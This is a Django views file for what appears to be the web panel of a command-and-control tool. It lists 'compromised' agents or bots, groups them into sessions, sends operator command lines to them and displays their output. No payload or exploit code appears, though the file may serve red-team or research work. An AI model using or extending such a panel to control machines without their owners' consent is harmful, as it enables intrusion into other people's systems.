from django.views.decorators.http import require_POST
from django.shortcuts import redirect, reverse, render
from django.http import HttpResponse
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from django.http import JsonResponse

from ..api.models import Agent, Session, Output
from ..api.utils import ERR_IDENTIFIER, Pipeline


@login_required(login_url="accounts:login")
def dashboard(request):
    compromised_agents = Agent.objects.all().exclude(identifier=ERR_IDENTIFIER)
    sessions = Session.objects.all()
    outputs = Output.objects.all()
    return render(request, 'webui/dashboard.html', {'agents':compromised_agents, 'sessions':sessions, 'outputs':outputs})


@login_required(login_url="accounts:login")
def agent_terminal(request, agent_identifier):
    session_id = Pipeline().create_session([agent_identifier])
    return redirect(reverse('webui:view_session', args=(session_id,)))


@login_required(login_url="accounts:login")
@require_POST
def create_session(request):
    """
    Initialise the session and redirects the webpage to the view session page

    :param request:
    :return:
    """
    agent_id_list = request.POST.getlist('selected_bots[]')
    session_id = Pipeline().create_session(agent_id_list)
    return redirect(reverse('webui:view_session', args=(session_id, )))


@login_required(login_url="accounts:login")
@require_POST
def delete_session(request):
    """
    Deletes the specified session (id) and redirects the webpage to the dashboard

    :param request:
    :return:
    """
    session_id = request.POST.getlist('del_sid')[0]
    destroy_session_obj = Pipeline()
    destroy_session_obj.destroy_session(int(session_id))
    return redirect(reverse('webui:dashboard'))


@login_required(login_url="accounts:login")
def view_session(request, session_id):
    """
    Returns the view session page which dynamically refresh the agents output

    :param request:
    :param session_id:
    :return:
    """
    agent_id_list = Pipeline().load_session(session_id)
    # Not displaying the selected_bots as of now, can be added in the future
    return render(request, 'webui/session.html', {'selected_bots': agent_id_list, 'session_id': session_id})


@login_required(login_url="accounts:login")
@require_POST
def refresh_terminal(request):
    """
    Function to handle refresh requests from session page
    """
    if request.is_ajax():
        # Get data from db again
        session_id = request.POST.get('session_id')
        session_outputs = Output.objects.filter(session_id=session_id)

        full_output = ''
        for session_output in session_outputs:
            output = '\n{}\n{}\n{}\n'.format(session_output.agent.display_name, '='*20, session_output.output)
            full_output += output

        return JsonResponse({'session_output': full_output})


@login_required(login_url="accounts:login")
@require_POST
def send_instruction(request):
    """
    Function to handle refresh requests from session page
    """
    session_id = request.POST.get('sid')
    command = request.POST.get('terminal')

    if command:
        command_pipe_obj = Pipeline()
        command_pipe_obj.load_session(session_id)
        command_pipe_obj.run(commandline=command)

    return redirect(reverse('webui:view_session', args=(session_id, )))
